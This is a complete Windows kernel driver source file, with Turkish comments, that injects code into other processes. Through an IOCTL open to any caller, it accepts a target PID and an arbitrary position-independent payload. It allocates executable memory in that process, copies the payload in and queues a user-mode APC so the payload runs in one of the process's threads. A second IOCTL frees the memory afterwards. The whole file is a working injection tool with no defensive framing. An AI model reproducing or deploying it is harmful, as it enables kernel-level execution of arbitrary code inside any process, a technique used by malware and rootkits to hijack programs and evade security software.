// kapc — payload yerleştirme + kullanıcı APC ile çalıştırma başlatma.
//
// Akış: ZwAllocateVirtualMemory (hedef VA) -> MmCopyVirtualMemory (payload
// kopyası) -> KeInitializeApc/KeInsertQueueApc (UserMode olağan rutin =
// payload VA). Payload olağan rutindir: dönüşünde eski kullanıcı bağlamı sürer.
// Win10 1803+ teslim kuralı: özel kullanıcı APC, uyarı (alertable) beklemeden
// kullanıcı dönüşünde yürür; daha eski yapılarda hedef iş parçacığının
// uyarılabilir olması gerekir.
#include <ntddk.h>

#define DSHKBR_DEVICE_NAME L"\\Device\\DshKbr"
#define DSHKBR_SYMLINK     L"\\DosDevices\\DshKbr"

#define IOCTL_KAPC_RUN  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x830, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KAPC_CLEAN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x831, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define SYS_PROCESS_INFO 5
#define KPAY_POOL_TAG 'pckD'

typedef struct _KAPC_RUN_REQ {
    UINT32 pid;
    UINT32 tid;          // 0: süreçteki ilk kullanıcı iş parçacığı
    UINT32 payload_len;
    UINT32 reserved;
    // ardından payload_len bayt payload gelir (PIC x64)
} KAPC_RUN_REQ;

typedef struct _KAPC_CLEAN_REQ { UINT32 pid; UINT32 reserved; UINT64 va; UINT64 size; } KAPC_CLEAN_REQ;

typedef struct _KAPC_RUN_RESP { UINT64 alloc_va; UINT32 tid; UINT32 queued; } KAPC_RUN_RESP;

// KAPC WDK başlıklarında opak; bilinen x64 yerleşimi.
typedef struct _KAPC_MIN {
    UCHAR  Type;              // 0x12
    UCHAR  SpareByte0;
    UCHAR  Size;              // sizeof(KAPC_MIN)
    UCHAR  SpareByte1;
    ULONG  SpareLong0;
    PKTHREAD Thread;
    LIST_ENTRY ApcListEntry;
    PVOID  KernelRoutine;
    PVOID  RundownRoutine;
    PVOID  NormalRoutine;
    PVOID  NormalContext;
    PVOID  SystemArgument1;
    PVOID  SystemArgument2;
    UCHAR  ApcStateIndex;
    CHAR   ApcMode;
    UCHAR  Inserted;
} KAPC_MIN, *PKAPC_MIN;

NTKERNELAPI VOID KeInitializeApc(PKAPC_MIN Apc, PKTHREAD Thread, KAPC_ENVIRONMENT Env,
    PVOID KernelRoutine, PVOID RundownRoutine, PVOID NormalRoutine,
    KPROCESSOR_MODE Mode, PVOID Context);
NTKERNELAPI BOOLEAN KeInsertQueueApc(PKAPC_MIN Apc, PVOID Arg1, PVOID Arg2, KPRIORITY Inc);

NTSYSAPI NTSTATUS ZwQuerySystemInformation(ULONG InfoClass, PVOID Buf, ULONG Len, PULONG RetLen);

typedef struct _SYS_THREAD_INFO {
    LARGE_INTEGER KernelTime, UserTime, CreateTime;
    ULONG  WaitTime;
    PVOID  StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    LONG   BasePriority;
    ULONG  ContextSwitches;
    ULONG  ThreadState;
    ULONG  WaitReason;
} SYS_THREAD_INFO;

typedef struct _SYS_PROC_INFO {
    ULONG  NextEntryOffset;
    ULONG  NumberOfThreads;
    LARGE_INTEGER Reserved1[3];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFrom;
    ULONG  HandleCount;
    ULONG  SessionId;
    ULONG_PTR Key;
    SIZE_T Stats[12];
    LARGE_INTEGER Io[6];
    SYS_THREAD_INFO Threads[1];
} SYS_PROC_INFO;

static PDEVICE_OBJECT g_device = NULL;

// WDK dışa aktarımları: süreç kolu üretimi ve süreçler arası kopya.
extern POBJECT_TYPE *PsProcessType;
NTKERNELAPI NTSTATUS ObOpenObjectByPointer(PVOID Object, ULONG Attributes,
                                           PACCESS_STATE AccessState,
                                           ACCESS_MASK DesiredAccess,
                                           POBJECT_TYPE ObjectType,
                                           KPROCESSOR_MODE AccessMode,
                                           PHANDLE Handle);
NTKERNELAPI NTSTATUS MmCopyVirtualMemory(PEPROCESS SourceProcess, PVOID SourceAddress,
                                         PEPROCESS TargetProcess, PVOID TargetAddress,
                                         SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode,
                                         PSIZE_T ReturnSize);

// APC sonlandırmaları: ayrılan KAPC bloğunu iki yoldan da geri alır.
static void ApcKernelRoutine(PKAPC_MIN apc, PVOID *norm, PVOID *ctx, PVOID *arg1, PVOID *arg2)
{
    UNREFERENCED_PARAMETER(norm); UNREFERENCED_PARAMETER(ctx);
    UNREFERENCED_PARAMETER(arg1); UNREFERENCED_PARAMETER(arg2);
    ExFreePoolWithTag(apc, KPAY_POOL_TAG);
}

static void ApcRundown(PKAPC_MIN apc)
{
    ExFreePoolWithTag(apc, KPAY_POOL_TAG);
}

// Süreçteki ilk iş parçacığını seçer (tid verilmediyse).
static NTSTATUS PickThread(UINT32 pid, UINT32 tid_opt, PKTHREAD *out_thread, UINT32 *out_tid)
{
    if (tid_opt != 0) {
        PETHREAD th = NULL;
        NTSTATUS st = PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)tid_opt, &th);
        if (!NT_SUCCESS(st)) return st;
        *out_thread = (PKTHREAD)th;
        *out_tid = tid_opt;
        return STATUS_SUCCESS;
    }

    ULONG len = 0x10000, ret = 0;
    PVOID buf = ExAllocatePool2(POOL_FLAG_PAGED, len, KPAY_POOL_TAG);
    if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
    for (;;) {
        NTSTATUS st = ZwQuerySystemInformation(SYS_PROCESS_INFO, buf, len, &ret);
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            ExFreePoolWithTag(buf, KPAY_POOL_TAG);
            len *= 2;
            buf = ExAllocatePool2(POOL_FLAG_PAGED, len, KPAY_POOL_TAG);
            if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
            continue;
        }
        if (!NT_SUCCESS(st)) { ExFreePoolWithTag(buf, KPAY_POOL_TAG); return st; }
        break;
    }

    NTSTATUS found = STATUS_NOT_FOUND;
    for (SYS_PROC_INFO *pi = (SYS_PROC_INFO *)buf;; ) {
        if ((UINT32)(ULONG_PTR)pi->UniqueProcessId == pid) {
            for (ULONG t = 0; t < pi->NumberOfThreads; t++) {
                PETHREAD eth = NULL;
                if (NT_SUCCESS(PsLookupThreadByThreadId(pi->Threads[t].ClientId.UniqueThread, &eth))) {
                    *out_thread = (PKTHREAD)eth;
                    *out_tid = (UINT32)(ULONG_PTR)pi->Threads[t].ClientId.UniqueThread;
                    found = STATUS_SUCCESS;
                    break;
                }
            }
            break;
        }
        if (pi->NextEntryOffset == 0) break;
        pi = (SYS_PROC_INFO *)((PUCHAR)pi + pi->NextEntryOffset);
    }
    ExFreePoolWithTag(buf, KPAY_POOL_TAG);
    return found;
}

static NTSTATUS HandleRun(const KAPC_RUN_REQ *rq, const UCHAR *payload, KAPC_RUN_RESP *resp)
{
    RtlZeroMemory(resp, sizeof(*resp));
    PEPROCESS proc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)rq->pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    HANDLE ph = NULL;
    st = ObOpenObjectByPointer(proc, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS,
                               *PsProcessType, KernelMode, &ph);
    if (!NT_SUCCESS(st)) { ObDereferenceObject(proc); return st; }

    // 1) hedefte çalıştırılabilir VA
    PVOID base = NULL;
    SIZE_T size = rq->payload_len;
    st = ZwAllocateVirtualMemory(ph, &base, 0, &size, MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(st)) goto out_handle;

    // 2) payload kopyası — kaynak çağrının arabelleği (çekirdek havuzu; her
    //    süreç haritasında geçerli), hedef sürecin yeni VA'sı.
    SIZE_T done = 0;
    st = MmCopyVirtualMemory(PsGetCurrentProcess(), (PVOID)payload, proc, base,
                             rq->payload_len, KernelMode, &done);
    if (!NT_SUCCESS(st) || done != rq->payload_len) goto out_mem;

    // 3) iş parçacığı seç + kullanıcı APC kuyruğa al
    PKTHREAD th = NULL;
    UINT32 used_tid = 0;
    st = PickThread(rq->pid, rq->tid, &th, &used_tid);
    if (!NT_SUCCESS(st)) goto out_mem;

    PKAPC_MIN apc = (PKAPC_MIN)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC_MIN), KPAY_POOL_TAG);
    if (!apc) { ObDereferenceObject((PETHREAD)th); st = STATUS_INSUFFICIENT_RESOURCES; goto out_mem; }

    // Olağan rutin = payload; kullanıcı kipinde teslim edilir, dönüşte eski
    // kullanıcı bağlamına devam edilir.
    KeInitializeApc(apc, th, CurrentApcEnvironment,
                    (PVOID)ApcKernelRoutine, (PVOID)ApcRundown, base,
                    UserMode, NULL);
    if (KeInsertQueueApc(apc, NULL, NULL, IO_NO_INCREMENT)) {
        resp->alloc_va = (UINT64)(ULONG_PTR)base;
        resp->tid = used_tid;
        resp->queued = 1;
        st = STATUS_SUCCESS;
    } else {
        ExFreePoolWithTag(apc, KPAY_POOL_TAG);
        st = STATUS_UNSUCCESSFUL;
    }
    ObDereferenceObject((PETHREAD)th);

    if (NT_SUCCESS(st)) { ZwClose(ph); ObDereferenceObject(proc); return st; }

out_mem:
    ZwFreeVirtualMemory(ph, &base, &size, MEM_RELEASE);
out_handle:
    ZwClose(ph);
    ObDereferenceObject(proc);
    return st;
}

static NTSTATUS HandleClean(const KAPC_CLEAN_REQ *rq)
{
    PEPROCESS proc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)rq->pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    HANDLE ph = NULL;
    st = ObOpenObjectByPointer(proc, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS,
                               *PsProcessType, KernelMode, &ph);
    if (!NT_SUCCESS(st)) { ObDereferenceObject(proc); return st; }

    PVOID base = (PVOID)rq->va;
    SIZE_T size = 0;   // MEM_RELEASE: tüm ayırmayı geri alır
    st = ZwFreeVirtualMemory(ph, &base, &size, MEM_RELEASE);

    ZwClose(ph);
    ObDereferenceObject(proc);
    return st;
}

static NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT dev, PIRP irp)
{
    UNREFERENCED_PARAMETER(dev);
    PIO_STACK_LOCATION sp = IoGetCurrentIrpStackLocation(irp);
    NTSTATUS st = STATUS_INVALID_DEVICE_REQUEST;
    ULONG_PTR info = 0;
    ULONG in_len = sp->Parameters.DeviceIoControl.InputBufferLength;

    switch (sp->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_KAPC_RUN: {
        if (in_len < sizeof(KAPC_RUN_REQ)) { st = STATUS_BUFFER_TOO_SMALL; break; }
        KAPC_RUN_REQ *rq = (KAPC_RUN_REQ *)irp->AssociatedIrp.SystemBuffer;
        if (rq->payload_len == 0 ||
            in_len < sizeof(KAPC_RUN_REQ) + rq->payload_len) {
            st = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        UCHAR *payload = (UCHAR *)irp->AssociatedIrp.SystemBuffer + sizeof(KAPC_RUN_REQ);
        KAPC_RUN_RESP resp;
        st = HandleRun(rq, payload, &resp);
        if (NT_SUCCESS(st)) {
            RtlCopyMemory(irp->AssociatedIrp.SystemBuffer, &resp, sizeof(resp));
            info = sizeof(resp);
        }
        break;
    }
    case IOCTL_KAPC_CLEAN: {
        if (in_len < sizeof(KAPC_CLEAN_REQ)) { st = STATUS_BUFFER_TOO_SMALL; break; }
        st = HandleClean((KAPC_CLEAN_REQ *)irp->AssociatedIrp.SystemBuffer);
        break;
    }
    default:
        st = STATUS_INVALID_DEVICE_REQUEST;
    }

    irp->IoStatus.Status = st;
    irp->IoStatus.Information = info;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return st;
}

static void DriverUnload(PDRIVER_OBJECT drv)
{
    UNREFERENCED_PARAMETER(drv);
    UNICODE_STRING sym;
    RtlInitUnicodeString(&sym, DSHKBR_SYMLINK);
    IoDeleteSymbolicLink(&sym);
    if (g_device) IoDeleteDevice(g_device);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg)
{
    UNREFERENCED_PARAMETER(reg);
    UNICODE_STRING dev_name, sym_name;
    RtlInitUnicodeString(&dev_name, DSHKBR_DEVICE_NAME);
    RtlInitUnicodeString(&sym_name, DSHKBR_SYMLINK);

    NTSTATUS st = IoCreateDevice(drv, 0, &dev_name, FILE_DEVICE_UNKNOWN,
                                 FILE_DEVICE_SECURE_OPEN, FALSE, &g_device);
    if (!NT_SUCCESS(st)) return st;

    st = IoCreateSymbolicLink(&sym_name, &dev_name);
    if (!NT_SUCCESS(st)) { IoDeleteDevice(g_device); return st; }

    drv->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
    drv->DriverUnload = DriverUnload;
    g_device->Flags &= ~DO_DEVICE_INITIALIZING;
    return STATUS_SUCCESS;
}